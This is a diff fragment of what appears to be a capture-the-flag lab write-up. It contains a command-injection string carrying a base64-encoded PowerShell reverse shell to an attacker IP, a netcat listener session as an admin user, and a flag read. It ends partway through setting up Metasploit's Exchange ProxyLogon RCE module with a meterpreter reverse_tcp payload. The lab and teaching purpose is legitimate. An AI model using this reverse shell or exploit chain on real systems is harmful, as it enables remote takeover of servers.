@@ -353,3 +353,358 @@ d-----        1/25/2023  12:44 PM                MetaBack
 -a----        1/25/2023  12:11 PM         110080 iisreg.dll                                                            
 -a----        1/25/2023  12:15 PM          18432 iisreqs.dll                                                           
 -a----        1/25/2023  12:12 PM         231936 iisres.dll                                                            
+-a----        1/25/2023  12:11 PM          37888 iisrstas.exe                                                          
+-a----        1/25/2023  12:12 PM         192512 iissetup.exe                                                          
+-a----        1/25/2023  12:12 PM          57344 iissyspr.dll                                                          
+-a----        1/25/2023  12:11 PM          14848 iisual.exe                                                            
+-a----        1/25/2023  12:54 PM         262656 iisui.dll                                                             
+-a----        1/25/2023  12:54 PM          81408 IISUiObj.dll                                                          
+-a----        1/25/2023  12:12 PM         284672 iisutil.dll                                                           
+-a----        1/25/2023  12:12 PM         612864 iisw3adm.dll                                                          
+-a----        1/25/2023  12:54 PM         260608 iiswmi.dll                                                            
+-a----        1/25/2023  12:15 PM          33792 iis_ssi.dll                                                           
+-a----        1/25/2023  12:44 PM          16896 inetinfo.exe                                                          
+-a----        1/25/2023  12:54 PM         932352 inetmgr.dll                                                           
+-a----        1/25/2023  12:12 PM         125440 InetMgr.exe                                                           
+-a----        1/25/2023  12:54 PM          25088 InetMgr6.exe                                                          
+-a----        1/25/2023  12:44 PM         256000 infocomm.dll                                                          
+-a----        1/25/2023  12:15 PM          30208 iprestr.dll                                                           
+-a----        1/25/2023  12:15 PM         131584 isapi.dll                                                             
+-a----        1/25/2023  12:44 PM          67072 isatq.dll                                                             
+-a----        1/25/2023  12:44 PM          25600 iscomlog.dll                                                          
+-a----        1/25/2023  12:15 PM          24064 logcust.dll                                                           
+-a----        1/25/2023  12:12 PM          36352 loghttp.dll                                                           
+-a----        1/25/2023  12:54 PM          39424 logscrpt.dll                                                          
+-a----        1/25/2023  12:15 PM            330 logtemp.sql                                                           
+-a----        1/25/2023  12:54 PM          88064 logui.ocx                                                             
+-a----        1/25/2023  12:44 PM         685464 MBSchema.bin.00000000h                                                
+-a----        1/25/2023  12:44 PM         266906 MBSchema.xml                                                          
+-a----         4/7/2023   8:57 AM          10152 MetaBase.xml                                                          
+-a----        1/25/2023  12:44 PM         334848 metadata.dll                                                          
+-a----        1/25/2023  12:11 PM         147456 Microsoft.Web.Administration.dll                                      
+-a----        1/25/2023  12:12 PM        1052672 Microsoft.Web.Management.dll                                          
+-a----        1/25/2023  12:11 PM          44032 modrqflt.dll                                                          
+-a----        1/25/2023  12:12 PM         478720 nativerd.dll                                                          
+-a----        1/25/2023  12:12 PM          27136 protsup.dll                                                           
+-a----        1/25/2023  12:15 PM          21504 redirect.dll                                                          
+-a----        1/25/2023  12:44 PM          10752 rpcref.dll                                                            
+-a----        1/25/2023  12:12 PM          33792 rsca.dll                                                              
+-a----        1/25/2023  12:12 PM          51200 rscaext.dll                                                           
+-a----        1/25/2023  12:11 PM          40448 static.dll                                                            
+-a----        1/25/2023  12:54 PM          18944 svcext.dll                                                            
+-a----        1/25/2023  12:11 PM         189952 uihelper.dll                                                          
+-a----        1/25/2023  12:15 PM          23552 urlauthz.dll                                                          
+-a----        1/25/2023  12:54 PM          21504 validcfg.dll                                                          
+-a----        1/25/2023  12:15 PM         146250 w3core.mof                                                            
+-a----        1/25/2023  12:12 PM          16384 w3ctrlps.dll                                                          
+-a----        1/25/2023  12:11 PM          29696 w3ctrs.dll                                                            
+-a----        1/25/2023  12:11 PM         109568 w3dt.dll                                                              
+-a----        1/25/2023  12:15 PM           2560 w3isapi.mof                                                           
+-a----        1/25/2023  12:12 PM         101888 w3logsvc.dll                                                          
+-a----        1/25/2023  12:12 PM          29184 w3tp.dll                                                              
+-a----        1/25/2023  12:11 PM          26624 w3wp.exe                                                              
+-a----        1/25/2023  12:12 PM          78336 w3wphost.dll                                                          
+-a----        1/25/2023  12:44 PM          39936 wamreg.dll                                                            
+-a----        1/25/2023  12:12 PM          31744 wbhstipm.dll                                                          
+-a----        1/25/2023  12:12 PM          27648 wbhst_pm.dll                                                          
+-a----        1/25/2023  12:15 PM         189952 webdav.dll                                                            
+-a----        1/25/2023  12:15 PM          23552 webdav_simple_lock.dll                                                
+-a----        1/25/2023  12:15 PM          20480 webdav_simple_prop.dll                                                
+-a----        1/25/2023  12:54 PM          12288 WMSvc.exe                                                             
+-a----        9/15/2018  12:13 AM            165 wmsvc.exe.config                                                      
+-a----        1/25/2023  12:12 PM         169984 XPath.dll
+
+revshell
+
+powershell#3 base64
+
+');powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOAAuADEAOQAuADEAMAAzACIALAAxADMAMwA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==('
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 1338                                     
+listening on [any] 1338 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.61.189] 9779
+whoami
+thm\admin
+PS C:\windows\system32\inetsrv> dir
+
+    Directory: C:\windows\system32\inetsrv
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        1/25/2023   1:35 PM                backup                                                                
+d-----        1/25/2023  12:12 PM                Config                                                                
+d-----        1/25/2023  12:12 PM                en                                                                    
+d-----        1/25/2023   1:04 PM                en-US                                                                 
+d-----         4/7/2023   8:57 AM                History                                                               
+d-----        1/25/2023  12:44 PM                MetaBack                                                              
+-a----        1/25/2023  12:44 PM         252928 abocomp.dll                                                           
+-a----        1/25/2023  12:44 PM         324608 adsiis.dll                                                            
+-a----        1/25/2023  12:12 PM         119808 appcmd.exe                                                            
+-a----        9/15/2018  12:14 AM           3810 appcmd.xml                                                            
+-a----        1/25/2023  12:12 PM         181760 AppHostNavigators.dll                                                 
+-a----        1/25/2023  12:11 PM          80896 apphostsvc.dll                                                        
+-a----        1/25/2023  12:12 PM         406016 appobj.dll                                                            
+-a----        1/25/2023  12:15 PM         504320 asp.dll                                                               
+-a----        1/25/2023  12:15 PM          22196 asp.mof                                                               
+-a----        1/25/2023  12:11 PM         131072 aspnetca.exe                                                          
+-a----        1/25/2023  12:15 PM          23040 asptlb.tlb                                                            
+-a----        1/25/2023  12:12 PM          40448 authanon.dll                                                          
+-a----        1/25/2023  12:15 PM          38400 authbas.dll                                                           
+-a----        1/25/2023  12:15 PM          27136 authcert.dll                                                          
+-a----        1/25/2023  12:15 PM          44544 authmap.dll                                                           
+-a----        1/25/2023  12:15 PM          40960 authmd5.dll                                                           
+-a----        1/25/2023  12:15 PM          52736 authsspi.dll                                                          
+-a----        1/25/2023  12:15 PM          74240 browscap.dll                                                          
+-a----        1/25/2023  12:15 PM          34474 browscap.ini                                                          
+-a----        1/25/2023  12:11 PM          24064 cachfile.dll                                                          
+-a----        1/25/2023  12:11 PM          52224 cachhttp.dll                                                          
+-a----        1/25/2023  12:11 PM          15872 cachtokn.dll                                                          
+-a----        1/25/2023  12:11 PM          14336 cachuri.dll                                                           
+-a----        1/25/2023  12:15 PM          43520 cgi.dll                                                               
+-a----        1/25/2023  12:54 PM          99328 Cnfgprts.ocx                                                          
+-a----        1/25/2023  12:44 PM          86528 coadmin.dll                                                           
+-a----        1/25/2023  12:15 PM          43008 compdyn.dll                                                           
+-a----        1/25/2023  12:11 PM          54784 compstat.dll                                                          
+-a----        1/25/2023  12:12 PM          47104 custerr.dll                                                           
+-a----        1/25/2023  12:11 PM          20480 defdoc.dll                                                            
+-a----        1/25/2023  12:15 PM          38912 diprestr.dll                                                          
+-a----        1/25/2023  12:11 PM          24064 dirlist.dll                                                           
+-a----        1/25/2023  12:15 PM          68096 filter.dll                                                            
+-a----        1/25/2023  12:12 PM          38400 gzip.dll                                                              
+-a----        1/25/2023  12:11 PM          22016 httpmib.dll                                                           
+-a----        1/25/2023  12:11 PM          18432 hwebcore.dll                                                          
+-a----        1/25/2023  12:12 PM          63105 iis.msc                                                               
+-a----        1/25/2023  12:54 PM          48997 iis6.msc                                                              
+-a----        1/25/2023  12:44 PM          26112 iisadmin.dll                                                          
+-a----        1/25/2023  12:44 PM        1016832 iiscfg.dll                                                            
+-a----        1/25/2023  12:11 PM         307200 iiscore.dll                                                           
+-a----        1/25/2023  12:15 PM         132608 iisetw.dll                                                            
+-a----        1/25/2023  12:44 PM         104448 iisext.dll                                                            
+-a----        1/25/2023  12:15 PM          86016 iisfcgi.dll                                                           
+-a----        1/25/2023  12:15 PM         168448 iisfreb.dll                                                           
+-a----        1/25/2023  12:15 PM          88576 iislog.dll                                                            
+-a----        1/25/2023  12:11 PM         110080 iisreg.dll                                                            
+-a----        1/25/2023  12:15 PM          18432 iisreqs.dll                                                           
+-a----        1/25/2023  12:12 PM         231936 iisres.dll                                                            
+-a----        1/25/2023  12:11 PM          37888 iisrstas.exe                                                          
+-a----        1/25/2023  12:12 PM         192512 iissetup.exe                                                          
+-a----        1/25/2023  12:12 PM          57344 iissyspr.dll                                                          
+-a----        1/25/2023  12:11 PM          14848 iisual.exe                                                            
+-a----        1/25/2023  12:54 PM         262656 iisui.dll                                                             
+-a----        1/25/2023  12:54 PM          81408 IISUiObj.dll                                                          
+-a----        1/25/2023  12:12 PM         284672 iisutil.dll                                                           
+-a----        1/25/2023  12:12 PM         612864 iisw3adm.dll                                                          
+-a----        1/25/2023  12:54 PM         260608 iiswmi.dll                                                            
+-a----        1/25/2023  12:15 PM          33792 iis_ssi.dll                                                           
+-a----        1/25/2023  12:44 PM          16896 inetinfo.exe                                                          
+-a----        1/25/2023  12:54 PM         932352 inetmgr.dll                                                           
+-a----        1/25/2023  12:12 PM         125440 InetMgr.exe                                                           
+-a----        1/25/2023  12:54 PM          25088 InetMgr6.exe                                                          
+-a----        1/25/2023  12:44 PM         256000 infocomm.dll                                                          
+-a----        1/25/2023  12:15 PM          30208 iprestr.dll                                                           
+-a----        1/25/2023  12:15 PM         131584 isapi.dll                                                             
+-a----        1/25/2023  12:44 PM          67072 isatq.dll                                                             
+-a----        1/25/2023  12:44 PM          25600 iscomlog.dll                                                          
+-a----        1/25/2023  12:15 PM          24064 logcust.dll                                                           
+-a----        1/25/2023  12:12 PM          36352 loghttp.dll                                                           
+-a----        1/25/2023  12:54 PM          39424 logscrpt.dll                                                          
+-a----        1/25/2023  12:15 PM            330 logtemp.sql                                                           
+-a----        1/25/2023  12:54 PM          88064 logui.ocx                                                             
+-a----        1/25/2023  12:44 PM         685464 MBSchema.bin.00000000h                                                
+-a----        1/25/2023  12:44 PM         266906 MBSchema.xml                                                          
+-a----         4/7/2023   8:57 AM          10152 MetaBase.xml                                                          
+-a----        1/25/2023  12:44 PM         334848 metadata.dll                                                          
+-a----        1/25/2023  12:11 PM         147456 Microsoft.Web.Administration.dll                                      
+-a----        1/25/2023  12:12 PM        1052672 Microsoft.Web.Management.dll                                          
+-a----        1/25/2023  12:11 PM          44032 modrqflt.dll                                                          
+-a----        1/25/2023  12:12 PM         478720 nativerd.dll                                                          
+-a----        1/25/2023  12:12 PM          27136 protsup.dll                                                           
+-a----        1/25/2023  12:15 PM          21504 redirect.dll                                                          
+-a----        1/25/2023  12:44 PM          10752 rpcref.dll                                                            
+-a----        1/25/2023  12:12 PM          33792 rsca.dll                                                              
+-a----        1/25/2023  12:12 PM          51200 rscaext.dll                                                           
+-a----        1/25/2023  12:11 PM          40448 static.dll                                                            
+-a----        1/25/2023  12:54 PM          18944 svcext.dll                                                            
+-a----        1/25/2023  12:11 PM         189952 uihelper.dll                                                          
+-a----        1/25/2023  12:15 PM          23552 urlauthz.dll                                                          
+-a----        1/25/2023  12:54 PM          21504 validcfg.dll                                                          
+-a----        1/25/2023  12:15 PM         146250 w3core.mof                                                            
+-a----        1/25/2023  12:12 PM          16384 w3ctrlps.dll                                                          
+-a----        1/25/2023  12:11 PM          29696 w3ctrs.dll                                                            
+-a----        1/25/2023  12:11 PM         109568 w3dt.dll                                                              
+-a----        1/25/2023  12:15 PM           2560 w3isapi.mof                                                           
+-a----        1/25/2023  12:12 PM         101888 w3logsvc.dll                                                          
+-a----        1/25/2023  12:12 PM          29184 w3tp.dll                                                              
+-a----        1/25/2023  12:11 PM          26624 w3wp.exe                                                              
+-a----        1/25/2023  12:12 PM          78336 w3wphost.dll                                                          
+-a----        1/25/2023  12:44 PM          39936 wamreg.dll                                                            
+-a----        1/25/2023  12:12 PM          31744 wbhstipm.dll                                                          
+-a----        1/25/2023  12:12 PM          27648 wbhst_pm.dll                                                          
+-a----        1/25/2023  12:15 PM         189952 webdav.dll                                                            
+-a----        1/25/2023  12:15 PM          23552 webdav_simple_lock.dll                                                
+-a----        1/25/2023  12:15 PM          20480 webdav_simple_prop.dll                                                
+-a----        1/25/2023  12:54 PM          12288 WMSvc.exe                                                             
+-a----        9/15/2018  12:13 AM            165 wmsvc.exe.config                                                      
+-a----        1/25/2023  12:12 PM         169984 XPath.dll   
+
+PS C:\windows\system32\inetsrv> cd c:/
+```
+```text
+- PS C:\> dir
+
+    Directory: C:\
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        1/25/2023  11:44 AM                934484d0a9de05fc41a4dc84                                              
+d-----        1/26/2023  10:36 AM                ExchangeSetupLogs                                                     
+d-----        1/25/2023  12:12 PM                inetpub                                                               
+d-----        9/15/2018  12:19 AM                PerfLogs                                                              
+d-r---        2/28/2023   2:23 PM                Program Files                                                         
+d-----        1/25/2023  11:41 AM                Program Files (x86)                                                   
+d-----        1/25/2023   1:34 PM                root                                                                  
+d-r---        1/26/2023   1:16 PM                Users                                                                 
+d-----        3/29/2023   2:34 AM                Windows                                                               
+-a----         4/7/2023   8:57 AM             31 BitlockerActiveMonitoringLogs
+```
+```text
+- PS C:\> cd Users
+PS C:\Users> dir
+
+    Directory: C:\Users
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        1/25/2023  12:54 PM                .NET v4.5                                                             
+d-----        1/25/2023  12:54 PM                .NET v4.5 Classic                                                     
+d-----        3/21/2023  11:40 AM                Administrator                                                         
+d-----        2/21/2023  12:31 AM                dev                                                                   
+d-r---        1/25/2023   8:15 PM                Public                                                                
+
+PS C:\Users> cd Administrator
+PS C:\Users\Administrator> dir
+PS C:\Users\Administrator> dir -h
+PS C:\Users\Administrator> dir /a:h
+PS C:\Users\Administrator> cd ..
+PS C:\Users> cd dev
+PS C:\Users\dev> dir 
+
+    Directory: C:\Users\dev
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-r---        1/26/2023   1:16 PM                3D Objects                                                            
+d-r---        1/26/2023   1:16 PM                Contacts                                                              
+d-r---        2/12/2023  11:54 AM                Desktop                                                               
+d-r---        1/26/2023   1:16 PM                Documents                                                             
+d-r---        1/26/2023   1:16 PM                Downloads                                                             
+d-r---        1/26/2023   1:16 PM                Favorites                                                             
+d-r---        1/26/2023   1:16 PM                Links                                                                 
+d-r---        1/26/2023   1:16 PM                Music                                                                 
+d-r---        1/26/2023   1:16 PM                Pictures                                                              
+d-r---        1/26/2023   1:16 PM                Saved Games                                                           
+d-r---        1/26/2023   1:16 PM                Searches                                                              
+d-r---        1/26/2023   1:16 PM                Videos                                                                
+
+PS C:\Users\dev> cd Desktop
+PS C:\Users\dev\Desktop> dir
+
+    Directory: C:\Users\dev\Desktop
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        3/21/2023  12:28 PM            512 TODO.txt                                                              
+-a----        2/12/2023  11:53 AM             29 user.txt                                                              
+
+PS C:\Users\dev\Desktop> type user.txt
+THM{Stop_Reading_Start_Doing}
+PS C:\Users\dev\Desktop> type TODO.txt
+Hey dev team,
+
+This is the tasks list for the deadline:
+
+Promote Server to Domain Controller [DONE]
+Setup Microsoft Exchange [DONE]
+Setup IIS [DONE]
+Remove the log analyzer[TO BE DONE]
+Add all the users from the infra department [TO BE DONE]
+Install the Security Update for MS Exchange [TO BE DONE]
+Setup LAPS [TO BE DONE]
+
+When you are done with the tasks please send an email to:
+
+joe@thm.local
+carol@thm.local
+and do not forget to put in CC the infra team!
+dev-infrastracture-team@thm.local
+
+Install the Security Update for MS Exchange
+
+┌──(witty㉿kali)-[~/Downloads/maigret]
+└─$ msfconsole -q
+```
+```text
+- msf6 > search microsoft exchange
+
+Matching Modules
+================
+```
+```text
+- #   Name                                                          Disclosure Date  Rank       Check  Description
+   -   ----                                                          ---------------  ----       -----  -----------
+   0   exploit/windows/http/exchange_ecp_viewstate                          excellent  Yes    Exchange Control Panel ViewState Deserialization
+   1   auxiliary/scanner/http/exchange_web_server_pushsubscription          normal     No     Microsoft Exchange Privilege Escalation Exploit
+   2   auxiliary/gather/exchange_proxylogon_collector                       normal     No     Microsoft Exchange ProxyLogon Collector
+   3   exploit/windows/http/exchange_proxylogon_rce                         excellent  Yes    Microsoft Exchange ProxyLogon RCE
+   4   auxiliary/scanner/http/exchange_proxylogon                           normal     No     Microsoft Exchange ProxyLogon Scanner
+   5   exploit/windows/http/exchange_proxynotshell_rce                      excellent  Yes    Microsoft Exchange ProxyNotShell RCE
+   6   exploit/windows/http/exchange_proxyshell_rce                         excellent  Yes    Microsoft Exchange ProxyShell RCE
+   7   exploit/windows/http/exchange_chainedserializationbinder_rce         excellent  Yes    Microsoft Exchange Server ChainedSerializationBinder RCE
+   8   exploit/windows/http/exchange_ecp_dlp_policy                         excellent  Yes    Microsoft Exchange Server DlpUtils AddTenantDlpPolicy RCE
+   9   exploit/linux/local/cve_2021_38648_omigod                     2021-09-14       excellent  Yes    Microsoft OMI Management Interface Authentication Bypass
+   10  auxiliary/gather/office365userenum                                   normal     No     Office 365 User Enumeration
+   11  auxiliary/scanner/http/owa_iis_internal_ip                           normal     No     Outlook Web App (OWA) / Client Access Server (CAS) IIS HTTP Internal IP Disclosure
+   12  post/windows/gather/exchange                                                   normal     No     Windows Gather Exchange Server Mailboxes
+
+Interact with a module by name or index. For example info 12, use 12 or use post/windows/gather/exchange
+```
+```text
+- msf6 > use 3
+[*] Using configured payload windows/x64/meterpreter/reverse_tcp
+```
+```text
+- msf6 exploit(windows/http/exchange_proxylogon_rce) > show options
+
+Module options (exploit/windows/http/exchange_proxylogon_rce):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   EMAIL                              yes       A known email address for this organization
+   METHOD            POST             yes       HTTP Method to use for the check (Accepted: GET, POST)
+   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT             443              yes       The target port (TCP)
+   SSL               true             no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                            no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                            no        The URI to use for this exploit (default is random)
+   UseAlternatePath  false            yes       Use the IIS root dir as alternate path
+   VHOST                              no        HTTP server virtual host
+
+   When CMDSTAGER::FLAVOR is one of auto,certutil,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all a
+                                       ddresses.
+   SRVPORT  8080             yes       The local port to listen on.
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.8.19.103      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+Exploit target:
